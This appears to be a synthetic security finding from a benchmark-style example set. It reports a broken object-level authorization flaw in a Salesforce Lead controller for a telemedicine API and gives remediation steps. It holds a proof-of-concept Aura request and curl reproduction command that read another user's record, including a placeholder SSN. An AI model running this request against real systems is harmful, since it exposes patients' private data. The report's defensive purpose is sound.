# Security Analysis Report
**System:** TeleCare Consultation API (Salesforce-Integrated)
**Domain:** Telemedicine / Remote Care
**Example ID:** SF-0086
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.12 | Mass assignment via object fields on `LeadController.getLeadData` — attacker reads any telemedicine Lead record including PHI |

---

## Finding 1 — BOLA: Mass Assignment via Object Fields on Lead Object (Pattern 1.12)

### Summary
The Apex controller `LeadController` on TeleCare Consultation API (`40462b57.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Lead object. Per §5.0 Pattern 1.12, the client-supplied `fields` array allows mass-reading all object attributes without server-side restriction. Telemedicine domain data may constitute PHI under HIPAA.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getLeadDetails(String leadId, ...)` while the Aura descriptor in §6.0 is `c.LeadController.getLeadData`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 1.12 — Mass assignment via object fields (BOLA)
**Affected controller:** `c.LeadController.getLeadData`
**Affected endpoint:** `POST https://40462b57.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://40462b57.lightning.force.com/aura
Authorization: Bearer 00D40462B57!AR40462b57...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D40462B57!AR40462b57...

message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN",
"params":{"leadId":"0012B57","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Lead Record Returned (PHI risk)**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0012B57", "Name": "Victim Lead Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-65-7811"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D40462B57!AR40462b57..."
curl -s -X POST "https://40462b57.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN","params":{"leadId":"0012B57","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-65-7811
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class LeadController { ... }`
2. `WHERE Id = :leadId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist (prevent mass-read of PHI custom fields). Validate `aura.token`. HIPAA audit compliance required.
